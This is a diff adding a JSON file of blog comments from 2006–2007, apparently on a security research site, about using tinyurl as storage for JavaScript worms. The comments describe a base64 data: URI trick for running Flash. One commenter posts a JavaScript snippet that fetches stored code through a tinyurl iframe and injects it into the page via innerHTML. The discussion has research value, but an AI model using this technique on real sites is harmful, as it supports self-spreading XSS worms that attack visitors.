@@ -1,0 +1,26 @@
+[
+  {
+    "author": "maluc",
+    "avatar": "803e289068dc08d5b34ae47778e67bb6",
+    "date": "2006-11-16T06:21:34.000Z",
+    "content": "Actually, tinyurl does have a persistent XSS. So i think the more accurate sentence would be \"This does NOT use an XSS on tinyurl.\"\r\n\r\nAnd you say it's to use for remote storage, but what sort of example storage would a javascript worm need? i mean, i can't think of a way to load any dynamic flash or file like this with IE. Like can you think of a sample attack using it? i'm just drawing a blank..\r\n\r\nIt's a good idea if it does have some use.. but there's alot of ways to use remote storage. For example, putting it on a myspace page.. then using your double proxy iframes method to extract it. You can put it on anyy site that allows user content - forums, comments, wordpress, etc. Assuming it can handle the bandwidth of a worm.\r\n\r\n-maluc"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2006-11-16T07:24:36.000Z",
+    "content": "maluc,\n\nI tried to be ironic. tinyurl does have persistent XSS but I am not disclousing that, and it doesn't matter anyway. \n\n<blockquote>And you say it's to use for remote storage, but what sort of example storage would a javascript worm need? i mean, i can't think of a way to load any dynamic flash or file like this with IE. Like can you think of a sample attack using it? i'm just drawing a blank..</blockquote>\n\nThis is easy. Get the base64 value and append the following in front of it: data:application/x-shockwave-flash;base64,. Put that into an iframe src attribute and you have the flash running. This doesn't work on IE though. More on that <a href=\"http://www.gnucitizen.org/blog/self-contained-xss-attacks\" rel=\"nofollow\">here</a> and <a href=\"http://www.gnucitizen.org/blog/a-bag-full-of-tricks\" rel=\"nofollow\">here</a>.\n\n<blockquote>... but there's a lot of ways to use remote storage ... you can put it on any site that allows user content</blockquote>\n\nYes I agree on that, but I want something that is more agile, as I said in this post. I want to create a virtual file system that the agent can operate without requiring assistance. This is where tinyurl shines: everyone is free to shrink, no registration is required."
+  },
+  {
+    "author": "luma",
+    "avatar": "7e907ebcb3846cb393630eb424d839ed",
+    "date": "2007-01-01T21:55:25.000Z",
+    "content": "Yes interesting, I decided to write my own version:\r\n\r\nThis only works in localhost\r\n \r\n<pre><code>lol = document.createElement('iframe');\r\nlol.src = 'http://tinyurl.com/ym7yba';\r\ndocument.body.appendChild(lol);\r\n\r\nfunction printCODE()\r\n{\r\ncode = lol.contentDocument.location + '';\r\n\r\nif(code)\r\n {\r\n body = document.getElementById('code');\r\n code = unescape(code);\r\n body.innerHTML = code.substr(28, code.length-18);\r\n }\r\n else\r\n {\r\n alert('error');\r\n }\r\n}\r\n\r\nsetInterval(\"printCODE()\", 3000);</code></pre>"
+  },
+  {
+    "author": "pdp",
+    "avatar": "c4db4e65c9f09f2a373fcaefa5e2bfb4",
+    "date": "2007-01-02T20:37:03.000Z",
+    "content": "interesting piece of code"
+  }
+]
